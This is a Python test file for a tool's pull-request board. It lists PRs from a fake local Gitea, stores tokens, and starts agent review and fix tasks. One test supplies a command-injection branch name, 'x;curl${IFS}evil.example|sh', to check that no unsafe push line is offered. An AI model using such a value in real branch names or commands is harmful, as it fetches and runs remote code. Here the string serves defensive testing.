"""The Board's pull requests: listed from the project's origin, set up from the page, and one fetched into the
project and reviewed through Handoff (gui/connections_api.py)."""
import json
import os
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from ixel_mat import connections
from ixel_mat.config import loader, secrets
from ixel_mat.gui.server import GuiServer
from ixel_mat.runtime import load_settings
from test_gui_board import fake  # noqa: F401 (a fixture)
from test_gui_server import AUTH, JSON_AUTH, TOKEN, run_with_client


def git(cwd, *args):
    return subprocess.run(["git", "-c", "user.name=Ada", "-c", "user.email=ada@example.com", *args], cwd=cwd,
                          capture_output=True, text=True, check=True).stdout.strip()


class GitHost:
    """A Gitea on 127.0.0.1: its API (pull requests) and the repository itself, over git's plain HTTP."""

    def __init__(self, bare: Path, token: str = ""):
        self.requests = []
        self.prs = []
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                path = self.path.split("?", 1)[0]
                if path.startswith("/api/"):
                    outer.requests.append({"path": self.path, "auth": self.headers.get("Authorization")})
                    if token and self.headers.get("Authorization") != f"token {token}":
                        return self.reply(404, b'{"message": "not found"}', "application/json")
                    if path == "/api/v1/repos/robin/shop/pulls":
                        return self.reply(200, json.dumps(outer.prs).encode(), "application/json")
                    return self.reply(404, b"{}", "application/json")
                file = bare / path.removeprefix("/robin/shop.git/")
                if path.startswith("/robin/shop.git/") and file.is_file():
                    return self.reply(200, file.read_bytes(), "application/octet-stream")
                self.reply(404, b"", "text/plain")

            def reply(self, status, data, kind):
                self.send_response(status)
                self.send_header("Content-Type", kind)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                pass

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.web = f"http://127.0.0.1:{self.server.server_port}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def hosted(tmp_path):
    """A repository on the fake host with a pull request (#7, card into main), and your clone of it."""
    work = tmp_path / "work"
    git(tmp_path, "init", "-q", "-b", "main", str(work))
    (work / "till.py").write_text("def total(items):\n    return sum(items)\n", encoding="utf-8")
    git(work, "add", "-A")
    git(work, "commit", "-q", "-m", "till")
    git(work, "switch", "-q", "-c", "card")
    (work / "pay.py").write_text("def pay(card):\n    return card.charge()\n", encoding="utf-8")
    git(work, "add", "-A")
    git(work, "commit", "-q", "-m", "pay by card")
    bare = tmp_path / "shop.git"
    git(tmp_path, "clone", "-q", "--bare", str(work), str(bare))
    git(bare, "update-ref", "refs/pull/7/head", "refs/heads/card")  # how Gitea and GitHub publish one
    git(bare, "update-server-info")
    host = GitHost(bare)
    mine = tmp_path / "mine"
    git(tmp_path, "clone", "-q", f"{host.web}/robin/shop.git", str(mine))
    (mine / "till.py").write_text("my own edit\n", encoding="utf-8")
    host.prs = [{"number": 7, "title": "Pay by card", "user": {"login": "ada"}, "draft": False,
                 "head": {"ref": "card", "sha": git(bare, "rev-parse", "card"), "repo": {"full_name": "robin/shop"}},
                 "base": {"ref": "main", "repo": {"full_name": "robin/shop"}},
                 "html_url": f"{host.web}/robin/shop/pulls/7", "updated_at": "2026-10-03T09:00:00Z"}]
    loader._GLOBAL_CONFIG.parent.mkdir(parents=True, exist_ok=True)
    loader._GLOBAL_CONFIG.write_text('[agents.gpt]\ntype = "http"\nurl = "https://api.openai.com/v1"\n'
                                     'token_env = "OPENAI_API_KEY"\nmodel = "gpt-5"\n', encoding="utf-8")
    yield host, mine.resolve(), bare
    host.close()


LABEL = "pull request #7 (card into main)"


def sealing(fake, ref):
    """A Handoff that reads a pull request's commits, and approves `ref` for them."""
    fake.answer("hello", {"data": {"handoff_version": "0.5.0", "schema": 1, "ops": ["board"],
                                   "features": ["run-target"]}})
    fake.answer("add", {"data": {"task": {"ref": ref}}})
    fake.answer("approve", {"data": {"task": {"ref": ref, "run": {"state": "approved", "of": LABEL}}}})


def gui(command=None):
    return GuiServer(token=TOKEN, settings_loader=load_settings, handoff_command=lambda: command)


async def look(client, project):
    resp = await client.get(f"/api/connections?project={project}", headers=AUTH)
    return resp.status, await resp.json()


async def post(client, path, **body):
    resp = await client.post(path, headers=JSON_AUTH, data=json.dumps(body))
    return resp.status, await resp.json()


def test_a_host_ixel_doesnt_know_is_set_once_then_its_pull_requests_are_listed(hosted):
    host, mine, _ = hosted

    async def scenario(client):
        before = await look(client, mine)
        elsewhere = await post(client, "/api/connections/host", project=str(mine), kind="gitea", url="https://evil.example")
        saved = await post(client, "/api/connections/host", project=str(mine), kind="gitea", url=host.web)
        return before, elsewhere, saved, await look(client, mine)

    (status, before), (refused, why), (ok, _), (_, after) = run_with_client(gui(), scenario)
    assert status == 200 and before["problem"]["code"] == "unknown_host" and before["origin"]["web"] == host.web
    assert refused == 400 and f"origin is on 127.0.0.1:{host.server.server_port}" in why["error"]
    assert ok == 200 and f'[connections."127.0.0.1:{host.server.server_port}"]\nkind = "gitea"\nurl = "{host.web}"' in \
        loader._GLOBAL_CONFIG.read_text(encoding="utf-8")
    assert after["host"]["kind"] == "gitea" and after["host"]["token"] == "none"
    [pr] = after["prs"]
    assert (pr["number"], pr["title"], pr["head"], pr["base"]) == (7, "Pay by card", "card", "main")


def test_a_token_is_saved_never_shown_and_sent_only_to_its_host(hosted, monkeypatch):
    host, mine, bare = hosted
    host.close()
    private = GitHost(bare, token="gitea-secret-123")
    private.prs = host.prs
    subprocess.run(["git", "-C", str(mine), "remote", "set-url", "origin", f"{private.web}/robin/shop.git"], check=True)
    env = connections.token_env(private.web)
    monkeypatch.delenv(env, raising=False)
    loader._GLOBAL_CONFIG.write_text(loader._GLOBAL_CONFIG.read_text(encoding="utf-8") +
                                     f'\n[connections."127.0.0.1:{private.server.server_port}"]\nkind = "gitea"\n'
                                     f'url = "{private.web}"\n',
                                     encoding="utf-8")
    try:
        async def scenario(client):
            before = await look(client, mine)
            saved = await post(client, "/api/connections/token", project=str(mine), value="gitea-secret-123")
            return before, saved, await look(client, mine)

        (_, before), (_, saved), (_, after) = run_with_client(gui(), scenario)
    finally:
        private.close()
        os.environ.pop(env, None)
    assert before["problem"]["code"] == "needs_token"
    assert saved["state"] == "file" and "gitea-secret-123" not in json.dumps([saved, after])
    assert after["host"]["token"] == "file" and after["prs"][0]["number"] == 7
    assert private.requests[-1]["auth"] == "token gitea-secret-123"
    assert secrets._saved()[env] == "gitea-secret-123"
    assert env in secrets._INJECTED  # so the programs Ixel starts don't get it


def test_no_token_is_saved_for_a_plain_http_server_on_your_network(hosted, monkeypatch):
    host, mine, _ = hosted
    loader._GLOBAL_CONFIG.write_text(loader._GLOBAL_CONFIG.read_text(encoding="utf-8") +
                                     f'\n[connections."127.0.0.1:{host.server.server_port}"]\nkind = "gitea"\n',
                                     encoding="utf-8")
    monkeypatch.setattr(connections, "tunnel_addresses", lambda name: [])  # as if 127.0.0.1 were your Wi-Fi
    env = connections.token_env(host.web)

    async def scenario(client):
        return (await look(client, mine),
                await post(client, "/api/connections/token", project=str(mine), value="gitea-secret-123"))

    (_, listed), (status, refused) = run_with_client(gui(), scenario)
    assert [pr["number"] for pr in listed["prs"]] == [7]  # a public repository needs no token
    assert status == 409 and "won't send one" in refused["error"] and env not in secrets._saved()


def test_a_token_isnt_saved_while_the_keychain_cant_be_opened(hosted, monkeypatch, keychain):
    host, mine, _ = hosted
    loader._GLOBAL_CONFIG.write_text(loader._GLOBAL_CONFIG.read_text(encoding="utf-8") +
                                     f'\n[connections."127.0.0.1:{host.server.server_port}"]\nkind = "gitea"\n',
                                     encoding="utf-8")
    env = connections.token_env(host.web)
    monkeypatch.delenv(env, raising=False)
    keychain.error = RuntimeError("locked")

    async def scenario(client):
        return await post(client, "/api/connections/token", project=str(mine), value="gitea-secret-123")

    status, refused = run_with_client(gui(), scenario)
    assert status == 503 and refused["error"] == ("Ixel couldn't open your Mac's Keychain, so nothing was saved. "
                                                  "Unlock it and try again.")
    assert env not in os.environ and not secrets.get_env_file_path().exists()


def test_review_fetches_it_and_approves_a_review_of_exactly_its_commits(hosted, fake):  # noqa: F811
    host, mine, bare = hosted
    loader._GLOBAL_CONFIG.write_text(loader._GLOBAL_CONFIG.read_text(encoding="utf-8") +
                                     f'\n[connections."127.0.0.1:{host.server.server_port}"]\nkind = "gitea"\n',
                                     encoding="utf-8")
    sealing(fake, "T-4")

    async def scenario(client):
        gone = await post(client, "/api/connections/review", project=str(mine), number=8, agent="codex")
        return gone, await post(client, "/api/connections/review", project=str(mine), number=7, agent="codex")

    (missing, said), (status, started) = run_with_client(gui(fake.command), scenario)
    assert missing == 404 and "isn't one of the open pull requests" in said["error"]
    assert status == 200 and started == {"task": "T-4", "label": "pull request #7 (card into main)"}
    head, base = git(bare, "rev-parse", "card"), git(bare, "rev-parse", "main")
    assert git(mine, "rev-parse", "refs/ixel/pr/7/head") == head
    assert (mine / "till.py").read_text(encoding="utf-8") == "my own edit\n"  # your work is as it was
    add, approve, run = [c["request"] for c in fake.calls() if c["request"]["op"] in ("add", "approve", "run.start")]
    assert add["args"]["title"] == "Review pull request #7 (card into main): Pay by card"
    assert "By ada." in add["args"]["body"] and "refs/ixel/pr/7/head" in add["args"]["body"]
    assert approve["args"] == {"task": "T-4", "agent": "codex", "kind": "review",
                               "target": {"base": base, "head": head, "label": "pull request #7 (card into main)"}}
    assert run["args"] == {"task": "T-4"}


def test_fix_has_an_agent_change_it_from_its_last_commit_and_says_how_to_push(hosted, fake):  # noqa: F811
    host, mine, bare = hosted
    loader._GLOBAL_CONFIG.write_text(loader._GLOBAL_CONFIG.read_text(encoding="utf-8") +
                                     f'\n[connections."127.0.0.1:{host.server.server_port}"]\nkind = "gitea"\n',
                                     encoding="utf-8")
    sealing(fake, "T-5")

    async def scenario(client):
        said = []
        for text in ("", "   ", "x" * 16_001):
            said.append(await post(client, "/api/connections/fix", project=str(mine), number=7, agent="claude",
                                   text=text))
        started = await post(client, "/api/connections/fix", project=str(mine), number=7, agent="claude",
                             text="Handle a declined card.\n")
        host.prs[0]["head"]["repo"] = {"full_name": "bo/shop"}  # now from a fork
        host.prs[0]["base"]["repo"] = {"full_name": "robin/shop"}
        forked = await post(client, "/api/connections/fix", project=str(mine), number=7, agent="claude", text="Again")
        return said, started, forked

    said, (status, started), (_, forked) = run_with_client(gui(fake.command), scenario)
    assert [s for s, _ in said] == [400, 400, 400] and "Say what to change" in said[0][1]["error"]
    assert "more than 16 KB" in said[2][1]["error"]
    assert status == 200 and started == {"task": "T-5", "label": "pull request #7 (card into main)",
                                         "push": "git push origin handoff/T-5:refs/heads/card"}
    calls = [c["request"] for c in fake.calls() if c["request"]["op"] in ("add", "note", "approve", "run.start")]
    add, note, approve, run = calls[:4]
    assert add["args"]["title"] == "Fix pull request #7 (card into main): Pay by card"
    assert add["args"]["body"].startswith("Handle a declined card.\n\n(The pull request is by ada.")
    assert note["args"] == {"task": "T-5", "text": "When the run is done, the work is on handoff/T-5, starting from "
                            "the pull request's last commit. To add it to the pull request: git push origin "
                            "handoff/T-5:refs/heads/card"}
    head, base = git(bare, "rev-parse", "card"), git(bare, "rev-parse", "main")
    assert approve["args"] == {"task": "T-5", "agent": "claude", "kind": "edit",
                               "target": {"base": base, "head": head, "label": "pull request #7 (card into main)"}}
    assert run["args"] == {"task": "T-5"}
    assert forked["push"] == "" and "(a fork)" in calls[5]["args"]["text"]


def _set_up(hosted):
    host, mine, _ = hosted
    loader._GLOBAL_CONFIG.write_text(loader._GLOBAL_CONFIG.read_text(encoding="utf-8") +
                                     f'\n[connections."127.0.0.1:{host.server.server_port}"]\nkind = "gitea"\n',
                                     encoding="utf-8")
    return host, mine


def ops(fake):
    return [c["request"]["op"] for c in fake.calls()]


def test_an_older_handoff_that_would_review_your_own_changes_isnt_asked(hosted, fake):  # noqa: F811
    _, mine = _set_up(hosted)  # (its hello doesn't say it reads a pull request's commits)

    async def scenario(client):
        return await post(client, "/api/connections/review", project=str(mine), number=7, agent="codex")

    status, said = run_with_client(gui(fake.command), scenario)
    assert status == 409 and "Update it with: handoff update" in said["error"] and "add" not in ops(fake)


@pytest.mark.parametrize("approve", [
    {"data": {"task": {"ref": "T-4", "run": {"state": "approved"}}}},          # approved, but not for its commits
    {"error": {"code": "busy", "message": "Another Handoff is writing the board."}},
])
def test_a_task_that_wasnt_approved_for_its_commits_isnt_left_behind(hosted, fake, approve):  # noqa: F811
    _, mine = _set_up(hosted)
    sealing(fake, "T-4")
    fake.answer("approve", approve)

    async def scenario(client):
        return await post(client, "/api/connections/review", project=str(mine), number=7, agent="codex")

    status, said = run_with_client(gui(fake.command), scenario)
    assert status in (409, 503, 400) and ops(fake)[-2:] == ["approve", "delete"] and "run.start" not in ops(fake)
    assert [c["request"]["args"] for c in fake.calls() if c["request"]["op"] == "delete"] == [{"task": "T-4"}]


def test_a_run_that_cant_start_says_so_and_stays_approved(hosted, fake):  # noqa: F811
    _, mine = _set_up(hosted)
    sealing(fake, "T-4")
    fake.answer("run.start", {"error": {"code": "invalid", "message": "Claude Code isn't installed. It's still "
                                                                      "approved, so it can run once that's fixed."}})

    async def scenario(client):
        return await post(client, "/api/connections/fix", project=str(mine), number=7, agent="claude", text="Do it")

    status, started = run_with_client(gui(fake.command), scenario)
    assert status == 200 and started["task"] == "T-4" and "still approved" in started["problem"]
    assert "delete" not in ops(fake)


@pytest.mark.parametrize("branch", ["x;curl${IFS}evil.example|sh",  # a name git allows
                                    "refs/heads/main"])  # pushed to by its short name, it could move main
def test_a_branch_name_a_shell_would_run_gets_no_line_to_paste(hosted, fake, branch):  # noqa: F811
    host, mine = _set_up(hosted)
    sealing(fake, "T-4")
    host.prs[0]["head"]["ref"] = branch
    fake.answer("approve", {"data": {"task": {"ref": "T-4", "run": {
        "of": f"pull request #7 ({branch} into main)"}}}})

    async def scenario(client):
        return await post(client, "/api/connections/fix", project=str(mine), number=7, agent="claude", text="Do it")

    status, started = run_with_client(gui(fake.command), scenario)
    assert status == 200 and started["push"] == ""
    [note] = [c["request"]["args"]["text"] for c in fake.calls() if c["request"]["op"] == "note"]
    assert "push handoff/T-4 to that branch yourself" in note and "git push" not in note


REAL_HANDOFF = os.environ.get("IXEL_TEST_HANDOFF_PYTHON", "")


@pytest.mark.skipif(not REAL_HANDOFF, reason="IXEL_TEST_HANDOFF_PYTHON isn't set")
def test_review_and_fix_with_the_real_handoff(hosted, tmp_path, monkeypatch):
    """What Ixel asks of Handoff, as the real `handoff api` takes it: the approvals it seals, and why a run that
    can't start here didn't."""
    from ixel_mat.gui import handoff_api
    host, mine, bare = hosted
    loader._GLOBAL_CONFIG.write_text(loader._GLOBAL_CONFIG.read_text(encoding="utf-8") +
                                     f'\n[connections."127.0.0.1:{host.server.server_port}"]\nkind = "gitea"\n',
                                     encoding="utf-8")
    monkeypatch.setenv("HANDOFF_APPROVAL_KEY", str(tmp_path / "approval.key"))
    monkeypatch.setenv("PATH", os.pathsep.join(p for p in os.environ["PATH"].split(os.pathsep)
                                               if not (Path(p) / "claude").exists() and not (Path(p) / "ixel").exists()))
    command = [REAL_HANDOFF, "-m", "handoff"]
    handoff_api.call("init", mine, {}, command)

    async def scenario(client):
        return (await post(client, "/api/connections/review", project=str(mine), number=7, agent="gpt"),
                await post(client, "/api/connections/fix", project=str(mine), number=7, agent="claude",
                           text="Handle a declined card."))

    (status, reviewed), (fixed_status, fixed) = run_with_client(gui(command), scenario)
    assert status == 200 and reviewed["task"] == "T-1", reviewed
    assert fixed_status == 200 and fixed["task"] == "T-2" and fixed["push"] == "git push origin handoff/T-2:refs/heads/card", fixed
    assert "It's still approved" in fixed["problem"]  # no Claude Code here, so it couldn't start
    review = handoff_api.call("task", mine, {"task": "T-1"}, command)
    assert any(e["summary"].startswith("approved it for gpt, through Ixel MAT, to review pull request #7 "
                                       "(card into main)") for e in review["events"])
    change = handoff_api.call("task", mine, {"task": "T-2"}, command)
    assert change["events"][-1]["summary"].startswith("approved it for the claude worker to work on pull request #7 "
                                                      "(card into main)")
    assert any("git push origin handoff/T-2:refs/heads/card" in e["text"] for e in change["events"])
    assert change["task"]["run"]["state"] == "approved" and change["task"]["run"]["of"] == \
        "pull request #7 (card into main)"


def test_a_project_without_a_hosted_origin_says_so(tmp_path):
    root = tmp_path / "local"
    git(tmp_path, "init", "-q", str(root))

    async def scenario(client):
        return await look(client, root.resolve())

    status, data = run_with_client(gui(), scenario)
    assert status == 200 and data == {"problem": {"code": "no_origin", "message": "This project has no `origin` "
                                                  "remote, so there are no pull requests to list."}}


def test_a_connections_setting_that_isnt_a_table_doesnt_break_the_board(tmp_path, monkeypatch):
    root = tmp_path / "shop"
    git(tmp_path, "init", "-q", str(root))
    git(root, "remote", "add", "origin", "https://github.com/robin/shop.git")
    loader._GLOBAL_CONFIG.parent.mkdir(parents=True, exist_ok=True)
    loader._GLOBAL_CONFIG.write_text('connections = "github"\n', encoding="utf-8")
    monkeypatch.setattr(connections, "pull_requests", lambda origin, host, token: [])

    async def scenario(client):
        return await look(client, root.resolve())

    status, data = run_with_client(gui(), scenario)
    assert status == 200 and data["host"]["kind"] == "github" and not data["host"]["set"] and data["prs"] == []
